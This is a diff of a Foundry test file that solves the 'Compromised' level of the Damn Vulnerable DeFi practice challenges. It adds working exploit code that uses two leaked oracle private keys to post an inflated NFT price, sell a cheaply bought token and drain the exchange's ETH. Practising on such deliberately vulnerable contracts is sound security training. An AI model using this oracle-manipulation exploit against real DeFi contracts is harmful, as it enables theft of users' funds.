@@ -73,16 +73,49 @@ contract Compromised is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
+        uint256 privateKey1 = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9;
+        uint256 privateKey2 = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48;
+        address[2] memory sources = [vm.rememberKey(privateKey1), vm.rememberKey(privateKey2)];
+        
+        uint256 tokenId = exchange.buyOne{value: INITIAL_NFT_PRICE}();
 
-        /**
-         * EXPLOIT END *
-         */
+        vm.prank(sources[0]);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE+INITIAL_NFT_PRICE);
+
+        vm.prank(sources[1]);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE+INITIAL_NFT_PRICE);
+
+        
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+        
+        console.log("exchange's balance:", address(exchange).balance);
+        console.log("attacker's balance:", address(attacker).balance);
+        console.log("Compromised's balance:", address(this).balance);
+
+        vm.prank(sources[0]);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        vm.prank(sources[1]);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4){
+        damnValuableNFT.transferFrom(address(this), attacker, tokenId);
+        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
+    }
+
+    fallback() payable external {}
 
     function validation() internal {
         // Exchange must have lost all ETH
